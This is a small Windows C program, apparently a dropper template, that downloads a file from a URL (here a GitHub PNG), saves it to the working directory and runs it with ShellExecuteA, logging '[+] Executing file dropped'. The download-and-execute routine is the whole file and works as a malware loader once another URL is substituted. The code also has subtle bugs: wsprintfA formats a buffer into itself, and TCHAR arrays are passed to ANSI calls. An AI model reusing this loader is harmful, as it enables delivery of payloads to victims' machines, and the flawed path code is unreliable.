#include <tchar.h>
#include <stdio.h>
#include <urlmon.h>
#include <Windows.h>
#pragma comment(lib, "urlmon.lib")

/*
** Ref 1: https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85)
** Ref 2: https://stackoverflow.com/a/5185008
*/

int main()
{
	TCHAR url[] = TEXT("https://github.com/fluidicon.png");
	TCHAR filePath[MAX_PATH];

	// Current working directory
	GetCurrentDirectoryA(MAX_PATH, filePath);

	// Format path to save downloaded file
	wsprintfA(filePath, TEXT("%s\\fluidicon.png"), filePath);

	// Download file from url
	HRESULT hRes = URLDownloadToFileA(NULL, url, filePath, 0, NULL);
	Sleep(400);

	// Print result
	if (hRes == S_OK) {
		printf(" [+] File download successfully.\n");
		Sleep(400);
		printf(" [+] Saved to: %s\n", filePath);
		Sleep(400);
		printf(" [+] Executing file dropped..!");
		Sleep(400);
		ShellExecuteA(NULL, "open", filePath, NULL, NULL, 1);
	} else if (hRes == E_OUTOFMEMORY) {
		printf(" [-] The buffer length is invalid.\n");
	} else if (hRes == INET_E_DOWNLOAD_FAILURE) {
		printf(" [-] The specified resource or callback interface was invalid.\n");
	} else {
		printf(" [-] Unknown Error!\n");
	}

	return 0;
}